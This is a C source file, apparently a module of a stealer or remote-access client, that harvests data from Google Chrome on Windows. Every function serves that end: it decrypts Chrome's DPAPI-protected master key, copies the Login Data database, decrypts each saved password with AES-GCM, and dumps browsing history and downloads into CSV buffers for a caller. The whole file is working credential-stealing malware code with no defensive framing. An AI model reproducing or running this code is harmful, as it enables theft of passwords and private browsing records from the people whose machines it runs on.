#include <windows.h>
#include <wincrypt.h>
#include <sqlite3.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include "common.h"
#include "client/utils.h"
#include "client/browser_pass.h"

#define CHROME_LOGIN_DATA \
    "C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
#define CHROME_HISTORY \
    "C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"

// "C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"

char* to_formatted_time(const char* chrome_time_str) {
    long long chrome_time = atoll(chrome_time_str);
    time_t seconds_since_1601 = chrome_time / 1000000;
    const time_t EPOCH_DIFF = 11644473600LL;
    time_t unix_time = seconds_since_1601 - EPOCH_DIFF;

    struct tm tm_info;
    if (localtime_s(&tm_info, &unix_time) != 0) return NULL;

    char* buffer = malloc(64);
    if (!buffer) return NULL;

    strftime(buffer, 64, "%Y-%m-%d %H:%M:%S", &tm_info);
    return buffer;
}

char* get_master_key() {
    char path[MAX_PATH];
    ExpandEnvironmentStringsA(
        "C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\User Data\\Local State",
        path, MAX_PATH);


    char* content = read_file(path, NULL);

    // Find encrypted_key inside "os_crypt":{"encrypted_key":"..."}
    char* key_str = strstr(content, "\"encrypted_key\":\"");
    if (!key_str) {
        free(content);
        return NULL;
    }

    key_str += 17;
    const char* end = strstr(key_str, "\"");
    int b64_len = end - key_str;

    unsigned char* b64_decoded = (unsigned char*)malloc(b64_len); // over-allocating here
    int decoded_len = b64_decode(key_str, b64_decoded);

    // check if first 5 bytes are "DPAPI"
    if (memcmp(b64_decoded, "DPAPI", 5) != 0) {
        free(b64_decoded);
        free(content);
        return NULL;
    }

    DATA_BLOB in, out;
    in.pbData = (BYTE*)(b64_decoded + 5);
    in.cbData = decoded_len - 5;

    if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
        char* master_key = malloc(out.cbData + 1);
        memcpy(master_key, out.pbData, out.cbData);
        master_key[out.cbData] = 0;
        LocalFree(out.pbData);
        free(b64_decoded);
        free(content);
        return master_key;
    }

    free(b64_decoded);
    free(content);
    return NULL;
}

int decrypt_password(BYTE* encrypted, int enc_len, char* master_key, char* out_password, int out_size) {
    // Chrome v80+ format: v10 + 12-byte IV + ciphertext + 16-byte tag
    if (enc_len < 3 || memcmp(encrypted, "v10", 3) != 0 && memcmp(encrypted, "v11", 3) != 0) {
        return 0;
    }

    BYTE* iv = encrypted + 3;
    BYTE* ciphertext = iv + 12;
    int ciphertext_len = enc_len - 3 - 12 - 16;
    BYTE* tag = ciphertext + ciphertext_len;

    BCRYPT_ALG_HANDLE alg = NULL;
    BCRYPT_KEY_HANDLE key = NULL;
    NTSTATUS status;

    status = BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) return 0;

    status = BCryptSetProperty(alg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO auth_info;
    BCRYPT_INIT_AUTH_MODE_INFO(auth_info);
    auth_info.pbNonce = iv;
    auth_info.cbNonce = 12;
    auth_info.pbTag = tag;
    auth_info.cbTag = 16;

    status = BCryptGenerateSymmetricKey(alg, &key, NULL, 0, (PBYTE)master_key, 32, 0);
    if (!BCRYPT_SUCCESS(status)) {
        if (key) BCryptDestroyKey(key);
        if (alg) BCryptCloseAlgorithmProvider(alg, 0);
        return 0;
    }

    DWORD decrypted_len = 0;
    status = BCryptDecrypt(key, ciphertext, ciphertext_len, &auth_info, iv, 12,
                           (BYTE*)out_password, out_size - 1, &decrypted_len, 0);
    if (BCRYPT_SUCCESS(status)) {
        out_password[decrypted_len] = 0;
        BCryptDestroyKey(key);
        BCryptCloseAlgorithmProvider(alg, 0);
        return 1;
    }

    if (key) BCryptDestroyKey(key);
    if (alg) BCryptCloseAlgorithmProvider(alg, 0);
    return 0;
}

// Must free returned pointer
char* get_browser_password() {
    char* master_key = get_master_key();

    char db_path[MAX_PATH];
    ExpandEnvironmentStringsA(CHROME_LOGIN_DATA, db_path, MAX_PATH);

    // Copy DB to temp location because Chrome locks it
    char temp_db[MAX_PATH];
    snprintf(temp_db, sizeof(temp_db), "%s\\Login Data.tmp", getenv("TEMP")); // %TEMP% is C:\Users\user\AppData\Local\Temp

    if (!CopyFileA(db_path, temp_db, FALSE)) {
        free(master_key);
        return NULL;
    }

    sqlite3* db;
    if (sqlite3_open(temp_db, &db) != SQLITE_OK) {
        printf("[-] Cannot open database\n");
        free(master_key);
        return NULL;
    }

    sqlite3_stmt* stmt;
    const char* sql = "SELECT origin_url, username_value, password_value FROM logins";
    
    // Allocate a big buffer to return
    size_t out_size = 1024 * 1024;
    char* out = malloc(out_size);
    if (!out) {
        sqlite3_close(db);
        DeleteFileA(temp_db);
        free(master_key);
        return NULL;
    }
    out[0] ='\0';
    strcat(out, "URL,USER,PASS\n");
    size_t offset = strlen(out);

    if (sqlite3_prepare_v2(db, sql, -1, &stmt, 0) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {

            const char* url  = (const char*)sqlite3_column_text(stmt, 0);
            const char* user = (const char*)sqlite3_column_text(stmt, 1);

            const unsigned char* enc_pass = sqlite3_column_blob(stmt, 2);
            int enc_len = sqlite3_column_bytes(stmt, 2);

            char password[1024] = {0};
            if (!decrypt_password((BYTE*)enc_pass, enc_len, master_key, password, sizeof(password))) {
                strcpy(password, "<decryption failed>");
            }

            // Append formatted line into output buffer
            int written = snprintf(out + offset, out_size - offset,
                          "%s,%s,%s\n",
                          url ? url : "", user ? user : "", password);
    
            if (written > 0 && (offset + written) < out_size) {
                offset += written;
    }
        }

        sqlite3_finalize(stmt);
    }

    sqlite3_close(db);
    DeleteFileA(temp_db);
    free(master_key);

    return out;
}

// Must free returned pointer
char* get_browser_history() {
    char db_path[MAX_PATH];
    ExpandEnvironmentStringsA(CHROME_HISTORY, db_path, MAX_PATH);

    // Copy DB to temp location because Chrome locks it
    char temp_db[MAX_PATH];
    snprintf(temp_db, sizeof(temp_db), "%s\\History.tmp", getenv("TEMP")); // %TEMP% is C:\Users\user\AppData\Local\Temp

    if (!CopyFileA(db_path, temp_db, FALSE)) {
        return NULL;
    }

    sqlite3* db;
    if (sqlite3_open(temp_db, &db) != SQLITE_OK) {
        printf("[-] Cannot open database\n");
        return NULL;
    }

    sqlite3_stmt* stmt;
    const char* sql = "SELECT url, title, visit_count, last_visit_time FROM urls";
    
    // Allocate a big buffer to return
    size_t out_size = 1024 * 1024;
    char* out = malloc(out_size);
    if (!out) {
        sqlite3_close(db);
        DeleteFileA(temp_db);
        return NULL;
    }
    out[0] = '\0';
    strcat(out, "URL,TITLE,VISIT_COUNT,LAST_VISIT_TIME\n");
    size_t offset = strlen(out);

    if (sqlite3_prepare_v2(db, sql, -1, &stmt, 0) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {

            const char* url  = (const char*)sqlite3_column_text(stmt, 0);
            const char* title = (const char*)sqlite3_column_text(stmt, 1);
            const char* visit_count = (const char*)sqlite3_column_text(stmt, 2);
            const char* last_visit_time = (const char*)sqlite3_column_text(stmt, 3);
            const char* formatted_time = to_formatted_time(last_visit_time);

            // Append formatted line into output buffer
            int written = snprintf(out + offset, out_size - offset,
                          "%s,%s,%s,%s\n",
                          url ? url : "", title ? title : "", visit_count ? visit_count : "", formatted_time ? formatted_time : "");
    
            if (written > 0 && (offset + written) < out_size) {
                offset += written;
            }
            free(formatted_time);
        }

        sqlite3_finalize(stmt);
    }

    sqlite3_close(db);
    DeleteFileA(temp_db);

    return out;
}

// Must free returned pointer
char* get_browser_downloads() {
    char db_path[MAX_PATH];
    ExpandEnvironmentStringsA(CHROME_HISTORY, db_path, MAX_PATH);

    // Copy DB to temp location because Chrome locks it
    char temp_db[MAX_PATH];
    snprintf(temp_db, sizeof(temp_db), "%s\\Downloads.tmp", getenv("TEMP")); // %TEMP% is C:\Users\user\AppData\Local\Temp

    if (!CopyFileA(db_path, temp_db, FALSE)) {
        return NULL;
    }

    sqlite3* db;
    if (sqlite3_open(temp_db, &db) != SQLITE_OK) {
        printf("[-] Cannot open database\n");
        return NULL;
    }

    sqlite3_stmt* stmt;
    const char* sql = "SELECT target_path, last_access_time, tab_url, mime_type FROM downloads";
    
    // Allocate a big buffer to return
    size_t out_size = 1024 * 1024;
    char* out = malloc(out_size);
    if (!out) {
        sqlite3_close(db);
        DeleteFileA(temp_db);
        return NULL;
    }
    out[0] = '\0';
    strcat(out, "TARGET_PATH,LAST_ACCESS_TIME,URL,MIME_TYPE\n");
    size_t offset = strlen(out);

    if (sqlite3_prepare_v2(db, sql, -1, &stmt, 0) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {

            const char* target_path  = (const char*)sqlite3_column_text(stmt, 0);
            const char* last_access_time = (const char*)sqlite3_column_text(stmt, 1);
            const char* site_url = (const char*)sqlite3_column_text(stmt, 2);
            const char* mime_type = (const char*)sqlite3_column_text(stmt, 3);
            const char* formatted_time = to_formatted_time(last_access_time);

            // Append formatted line into output buffer
            int written = snprintf(out + offset, out_size - offset,
                          "%s,%s,%s,%s\n",
                          target_path ? target_path : "", formatted_time ? formatted_time : "", site_url ? site_url : "", mime_type ? mime_type : "");
    
            if (written > 0 && (offset + written) < out_size) {
                offset += written;
            }
            free(formatted_time);
        }

        sqlite3_finalize(stmt);
    }

    sqlite3_close(db);
    DeleteFileA(temp_db);
    return out;
}